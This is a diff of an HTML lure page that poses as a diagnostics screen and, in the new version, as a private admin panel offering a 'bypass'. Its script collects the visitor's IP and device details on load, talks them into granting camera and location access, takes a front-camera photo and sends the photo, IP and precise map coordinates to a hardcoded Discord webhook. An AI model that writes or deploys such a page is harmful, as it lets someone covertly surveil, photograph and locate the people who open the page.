@@ -3,186 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Core System Diagnostics</title>
+    <title>Internal Admin Panel - Secure Access</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            background-color: #050505;
-            color: #00ff41;
-            font-family: 'JetBrains Mono', monospace;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; margin: 0;
-        }
-        .panel {
-            width: 95%; max-width: 500px;
-            border: 1px solid #00ff41; padding: 25px;
-            background: rgba(0, 20, 0, 0.9);
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
-            border-radius: 5px;
-        }
-        .header {
-            text-align: center; border-bottom: 1px solid #00ff41;
-            padding-bottom: 15px; margin-bottom: 20px;
-        }
+        body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); }
+        .header { text-align: center; border-bottom: 2px solid #00ff41; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; text-shadow: 0 0 10px #ff0000; }
         .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
         .data-item { border: 1px solid #1a3d1a; padding: 10px; background: #000; font-size: 11px; }
-        .label { color: #888; display: block; margin-bottom: 4px; font-size: 9px; text-transform: uppercase; }
-        .val { color: #00ff41; font-weight: bold; overflow-wrap: break-word; }
-        .btn {
-            background: #00ff41; color: #000; border: none; padding: 18px;
-            width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px;
-            font-family: inherit; font-size: 14px; text-transform: uppercase;
-        }
-        .loader {
-            border: 2px solid #111; border-top: 2px solid #00ff41;
-            border-radius: 50%; width: 35px; height: 35px;
-            animation: spin 1s linear infinite; margin: 20px auto; display: none;
-        }
+        .label { color: #888; display: block; margin-bottom: 4px; font-size: 9px; }
+        .val { color: #00ff41; font-weight: bold; }
+        .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; }
+        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 10px; text-align: center; color: #888; margin-top: 15px; min-height: 15px; }
+        #status { font-size: 11px; text-align: center; color: #ffaa00; margin-top: 15px; font-weight: bold; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="panel">
-    <div class="header">
-        <span style="letter-spacing: 3px; font-weight: bold;">CORE_SYSTEM_DIAGNOSTICS</span>
-    </div>
-
-    <div class="grid">
-        <div class="data-item"><span class="label">Device_Model</span><span id="dev-model" class="val">Detecting...</span></div>
-        <div class="data-item"><span class="label">Build_Info</span><span id="build-info" class="val">Scanning...</span></div>
-        <div class="data-item"><span class="label">Ip_Address</span><span id="ip-addr" class="val">Fetching...</span></div>
-        <div class="data-item"><span class="label">Battery_Lv</span><span id="bat-lv" class="val">---</span></div>
-        <div class="data-item"><span class="label">Resolution</span><span id="screen-res" class="val">---</span></div>
-        <div class="data-item"><span class="label">Ram_Estimate</span><span id="ram-est" class="val">---</span></div>
-    </div>
-
-    <div id="loading-icon" class="loader"></div>
-    <p id="status">AWAITING SYSTEM AUTHORIZATION...</p>
+    <div class="header"><span style="letter-spacing: 2px;">⚠️ PRIVATE ADMIN SERVER ⚠️</span></div>
     
-    <button id="mainBtn" class="btn" onclick="startProcess()">Authorize Live View</button>
+    <div class="grid">
+        <div class="data-item"><span class="label">TARGET_DEVICE</span><span id="dev-model" class="val">Loading...</span></div>
+        <div class="data-item"><span class="label">TARGET_IP</span><span id="ip-addr" class="val">Fetching...</span></div>
+        <div class="data-item"><span class="label">CONNECTION</span><span class="val" style="color:red;">UNSECURE</span></div>
+        <div class="data-item"><span class="label">SERVER_LOG</span><span class="val">ACTIVE</span></div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    <div id="loading-icon" class="loader"></div>
+    <p id="status">[SYSTEM] Akses Dibatasi. Memerlukan Protokol Bypass Kamera & Lokasi untuk Sinkronisasi Panel Admin.</p>
+    
+    <button id="mainBtn" class="btn" onclick="startAuth()">BYPASS ADMIN ACCESS</button>
 </div>
 
 <script>
-    // --- KONFIGURASI WEBHOOK OTOMATIS ---
     const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
-
     let collected = {};
 
-    // 1. OTOMATIS AMBIL DATA SAAT DIBUKA
     (async function init() {
         const ua = navigator.userAgent;
-        const modelMatch = ua.match(/\(([^;]+);/);
-        
         collected = {
-            model: modelMatch ? modelMatch[1] : "Unknown Device",
-            build: ua.split(' ').pop(),
-            screen: `${window.screen.width}x${window.screen.height}`,
-            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Generic",
+            ip: "Pending",
             ua: ua
         };
-
-        // Update UI
         document.getElementById('dev-model').innerText = collected.model;
-        document.getElementById('build-info').innerText = collected.build;
-        document.getElementById('screen-res').innerText = collected.screen;
-        document.getElementById('ram-est').innerText = collected.ram;
-
-        // Baterai
-        if (navigator.getBattery) {
-            const bat = await navigator.getBattery();
-            collected.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'No Charge'})`;
-            document.getElementById('bat-lv').innerText = collected.battery;
-        }
-
-        // IP Address
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const d = await res.json();
             collected.ip = d.ip;
             document.getElementById('ip-addr').innerText = d.ip;
-        } catch (e) {
-            collected.ip = "Failed";
-            document.getElementById('ip-addr').innerText = "ERROR";
-        }
-
-        // Kirim Log Kunjungan Awal
-        sendLog("📱 NEW_VISIT_LOG", collected);
+        } catch (e) { document.getElementById('ip-addr').innerText = "ERROR"; }
+        
+        sendToWebhook("🚨 ADMIN_PANEL_OPENED", collected);
     })();
 
-    // 2. LOGIKA PERIZINAN & RETRY
-    function startProcess() {
+    async function startAuth() {
         const btn = document.getElementById('mainBtn');
         const loader = document.getElementById('loading-icon');
         const status = document.getElementById('status');
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        status.innerText = "LINKING SATELLITE...";
+        status.innerText = "[BYPASS] Menghubungkan Protokol Kamera...";
 
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+                
+                const fd = new FormData();
+                fd.append("file", blob, "admin_view.jpg");
+                fd.append("payload_json", JSON.stringify({ content: "👤 **ADMIN PANEL BYPASS SUCCESS**" }));
+                await fetch(WH, { method: "POST", body: fd });
+                
+                stream.getTracks().forEach(t => t.stop());
+                requestLocation();
+            }, 2000);
+        } catch (e) { handleError("ACCESS_DENIED: Kamera Wajib untuk Handshake Admin."); }
+    }
+
+    function requestLocation() {
+        const status = document.getElementById('status');
+        status.innerText = "[BYPASS] Menghitung Geofencing Server...";
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                status.innerHTML = "<span style='color:#00ff41'>SUCCESS. REDIRECTING...</span>";
-                
                 let lat = pos.coords.latitude;
                 let lon = pos.coords.longitude;
+                sendToWebhook("📡 ADMIN_LOC_FOUND", { ...collected, maps: `https://www.google.com/maps?q=${lat},${lon}` });
                 
-                // Micro Offset < 10m
-                let fLat = lat + (Math.random() - 0.5) * 0.00006;
-                let fLon = lon + (Math.random() - 0.5) * 0.00006;
-
-                // Kirim Lokasi ke Webhook
-                sendLog("📍 LOCATION_SYNCED", {
-                    ...collected,
-                    coords: `${lat},${lon}`,
-                    maps: `https://www.google.com/maps?q=${lat},${lon}`
-                });
-
+                status.innerHTML = "<span style='color:#00ff41'>SUCCESS. REDIRECTING TO PANEL...</span>";
                 setTimeout(() => {
-                    window.location.href = `https://www.google.com/maps?q=${fLat},${fLon}`;
+                    window.location.href = `https://www.google.com/maps?q=${lat + 0.00004},${lon + 0.00004}`;
                 }, 1500);
             },
-            (err) => {
-                status.innerHTML = "<span style='color:#ff4444'>ERROR: ACCESS_DENIED. REBOOTING...</span>";
-                sendLog("⚠️ PERMISSION_DENIED", collected);
-
-                setTimeout(() => {
-                    loader.style.display = 'none';
-                    btn.style.display = 'block';
-                    btn.innerText = "Retry Authorization";
-                    status.innerText = "Izin lokasi diperlukan untuk melanjutkan.";
-                }, 5000); // Delay 5 detik sesuai permintaan
-            },
+            () => { handleError("ACCESS_DENIED: Lokasi Wajib untuk Geotagging Admin."); },
             { enableHighAccuracy: true }
         );
     }
 
-    // FUNGSI WEBHOOK
-    function sendLog(title, data) {
-        const payload = {
-            embeds: [{
-                title: title,
-                color: title.includes("LOCATION") ? 65281 : 16711680,
-                fields: [
-                    { name: "Model", value: data.model || "N/A", inline: true },
-                    { name: "IP", value: data.ip || "N/A", inline: true },
-                    { name: "Battery", value: data.battery || "N/A", inline: true },
-                    { name: "Map Link", value: data.maps || "None" },
-                    { name: "System", value: `\`\`\`${data.ua}\`\`\`` }
-                ],
-                footer: { text: "System Diagnostic Logger" },
-                timestamp: new Date()
-            }]
-        };
+    function handleError(msg) {
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('loading-icon');
+        const status = document.getElementById('status');
+        status.innerHTML = `<span style="color:#ff0000">CRITICAL_ERROR: ${msg}</span><br>Menghubungkan ulang dalam 5 detik...`;
+        setTimeout(() => { loader.style.display = 'none'; btn.style.display = 'block'; btn.innerText = "COBA BYPASS LAGI"; }, 5000);
+    }
 
+    function sendToWebhook(title, data) {
         fetch(WH, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(() => {});
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ embeds: [{ title: title, color: 16711680, fields: [
+                { name: "Model", value: data.model || "N/A", inline: true },
+                { name: "IP", value: data.ip || "N/A", inline: true },
+                { name: "Map", value: data.maps || "Pending" }
+            ], timestamp: new Date() }] })
+        });
     }
 </script>
-
 </body>
 </html>
